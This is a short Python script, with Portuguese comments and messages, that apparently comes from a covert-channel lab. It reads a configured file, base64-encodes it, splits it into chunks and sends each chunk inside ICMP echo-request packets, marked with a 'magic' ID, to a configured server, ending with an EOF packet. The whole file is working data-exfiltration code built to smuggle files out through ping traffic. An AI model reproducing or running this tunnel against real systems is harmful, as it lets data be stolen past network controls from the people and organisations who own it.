import base64
import time
from scapy.all import *
from . import config

def enviar_dados():
    try:
        with open(config.ARQUIVO_PARA_ENVIAR, "rb") as f:
            dados = f.read()
        dados_codificados = base64.b64encode(dados)
    except FileNotFoundError:
        print(f"Aviso: Arquivo '{config.ARQUIVO_PARA_ENVIAR}' não encontrado.")
        print("Criando um arquivo de exemplo para o teste.")
        exemplo_conteudo = b"Este e um teste secreto."
        with open(config.ARQUIVO_PARA_ENVIAR, "wb") as f:
            f.write(exemplo_conteudo)
        dados_codificados = base64.b64encode(exemplo_conteudo)

    chunks = [dados_codificados[i:i + config.TAMANHO_CHUNK] for i in range(0, len(dados_codificados), config.TAMANHO_CHUNK)]

    print(f"Enviando {len(chunks)} chunks para {config.IP_SERVIDOR}...")

    for i, chunk in enumerate(chunks):
        sequencia = i + 1
        payload = f"{sequencia}:{chunk.decode('utf-8')}".encode('utf-8')
        
        pacote = IP(dst=config.IP_SERVIDOR) / ICMP(id=config.ID_MAGICO, type="echo-request") / Raw(load=payload)
        
        send(pacote, verbose=0)
        print(f"  > Enviado chunk {sequencia}/{len(chunks)}")
        time.sleep(0.1)

    payload_fim = b"EOF:EOF"
    pacote_fim = IP(dst=config.IP_SERVIDOR) / ICMP(id=config.ID_MAGICO, type="echo-request") / Raw(load=payload_fim)
    send(pacote_fim, verbose=0)
    print("Transmissão finalizada.")

if __name__ == "__main__":
    enviar_dados()
